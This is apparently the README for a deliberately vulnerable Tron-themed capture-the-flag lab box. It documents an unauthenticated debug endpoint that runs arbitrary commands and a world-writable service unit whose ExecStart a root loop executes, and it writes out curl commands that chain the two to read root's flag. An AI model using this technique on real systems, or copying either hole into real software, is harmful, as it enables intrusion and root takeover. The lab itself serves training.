# Hill 11 - Light Cycle Arena (Tron) (unauth debug API -> RCE -> writable unit ExecStart)

*Theme: Tron / the Game Grid.* The arena ships a forgotten, unauthenticated debug
endpoint that runs commands.

- **Entry:** `GET /api/_debug/run?cmd=...` executes commands with no auth -> RCE.
  Foothold: `flynn`. Port 80 (8091 locally).
- **Privesc:** a root loop runs the `ExecStart=` line of `/opt/units/arena.service` every
  few seconds, and that unit file is world-writable. Rewrite `ExecStart` to your command;
  it runs as root within ~3s. Restored on reset.
- **Flags:** `user.txt` (foothold) and `/root/root.txt` (root).

## Attack chain

    # 1. unauth RCE -> user flag
    curl -s -G http://127.0.0.1:8091/api/_debug/run --data-urlencode 'cmd=cat /home/flynn/user.txt'

    # 2. privesc: point the unit's ExecStart at a root-run command that exposes root.txt
    curl -s -G http://127.0.0.1:8091/api/_debug/run --data-urlencode \
      'cmd=printf "ExecStart=cat /root/root.txt > /tmp/r; chmod 666 /tmp/r\n" > /opt/units/arena.service'
    sleep 4
    curl -s -G http://127.0.0.1:8091/api/_debug/run --data-urlencode 'cmd=cat /tmp/r'

    # 3. take the hill: same primitive, write your token to /root/king.txt
    curl -s -G http://127.0.0.1:8091/api/_debug/run --data-urlencode \
      'cmd=printf "ExecStart=echo TOK-YOUR-TEAM > /root/king.txt\n" > /opt/units/arena.service'

## Run locally

    docker compose up -d --build   # app: http://localhost:8091/

## Reset behaviour

`reset.sh` restores the world-writable unit with a benign `ExecStart`, keeps the root loop
and the server alive, and does **not** touch `king.txt`.
